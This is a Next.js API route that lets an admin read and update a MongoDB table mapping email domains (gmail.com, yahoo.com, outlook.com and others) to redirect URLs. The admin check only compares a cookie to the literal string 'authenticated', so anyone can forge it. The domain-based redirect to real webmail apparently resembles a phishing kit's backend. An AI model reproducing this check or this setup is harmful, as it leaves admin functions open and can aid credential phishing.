import { cookies } from 'next/headers'
import dbConnect from '@/lib/mongodb'
import Config from '@/lib/models/Config'

async function checkAuth() {
  const cookieStore = cookies()
  const session = cookieStore.get('admin_session')
  return session && session.value === 'authenticated'
}

export async function GET() {
  try {
    if (!await checkAuth()) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 })
    }

    await dbConnect()
    const configs = await Config.find({})
    
    const redirects = {}
    configs.forEach(config => {
      redirects[config.key] = config.value
    })

    if (!redirects['gmail.com']) redirects['gmail.com'] = 'https://gmail.com'
    if (!redirects['yahoo.com']) redirects['yahoo.com'] = 'https://yahoo.com'
    if (!redirects['outlook.com']) redirects['outlook.com'] = 'https://outlook.com'
    if (!redirects['hotmail.com']) redirects['hotmail.com'] = 'https://outlook.com'
    if (!redirects['live.com']) redirects['live.com'] = 'https://outlook.com'
    if (!redirects['default']) redirects['default'] = 'https://google.com'
    
    return Response.json({ redirects })
    
  } catch (error) {
    console.error('Get redirects error:', error)
    return Response.json({ error: 'Internal server error' }, { status: 500 })
  }
}

export async function POST(request) {
  try {
    if (!await checkAuth()) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const { domain, url } = await request.json()
    
    if (!domain || !url) {
      return Response.json({ message: 'Domain and URL required' }, { status: 400 })
    }

    await dbConnect()
    
    await Config.findOneAndUpdate(
      { key: domain },
      { key: domain, value: url, updatedAt: new Date() },
      { upsert: true, new: true }
    )
    
    return Response.json({ success: true, message: 'Redirect URL updated successfully' })
    
  } catch (error) {
    console.error('Update redirect error:', error)
    return Response.json({ message: 'Internal server error' }, { status: 500 })
  }
}